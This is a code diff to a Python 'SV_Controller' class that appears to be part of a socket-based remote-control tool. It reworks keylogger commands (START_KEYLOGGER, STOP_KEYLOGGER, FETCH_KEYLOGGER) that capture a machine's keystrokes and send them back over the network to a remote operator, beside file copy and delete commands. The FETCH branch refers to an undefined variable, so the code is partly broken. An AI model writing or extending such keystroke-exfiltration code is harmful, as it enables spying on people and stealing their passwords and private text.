@@ -120,16 +120,29 @@ class SV_Controller:
                             break
 
                 #5. Key Logger
-                elif command == "START_KEYLOGGER":
-                    listener = self.model.start_keylogger()
-                    self.model.send_command(client_socket, "Keylogger started.")
-                    # Listen for stop command
-                    while True:
-                        stop_command = self.model.receive_response(client_socket)
-                        if stop_command == "STOP_KEYLOGGER":
-                            result = self.model.stop_keylogger(listener)
-                            self.model.send_command(client_socket, result)
-                            break
+                elif command.startswith("START_KEYLOGGER"):
+                    self.model.start_keylogging(client_socket)
+                    
+                elif command.startswith("STOP_KEYLOGGER"):
+                    self.model.stop_keylogging(client_socket)
+                    keys = self.model.fetch_keys()
+                    self.model.send_command(client_socket, ",".join(keys).encode("utf-8"))
+                             
+                elif command.startswith("FETCH_KEYLOGGER"):
+                    self.model.fetch_keylogger(client_socket)
+                    self.model.send_command(client_socket, ",".join(keys).encode("utf-8"))
+                    
+                
+                # elif command == "START_KEYLOGGER":
+                #     listener = self.model.start_keylogger()
+                #     self.model.send_command(client_socket, "Keylogger started.")
+                #     # Listen for stop command
+                #     while True:
+                #         stop_command = self.model.receive_response(client_socket)
+                #         if stop_command == "STOP_KEYLOGGER":
+                #             result = self.model.stop_keylogger(listener)
+                #             self.model.send_command(client_socket, result)
+                #             break
 
                 #6. Del va Copy
                 if command.startswith("COPY_FILE"):
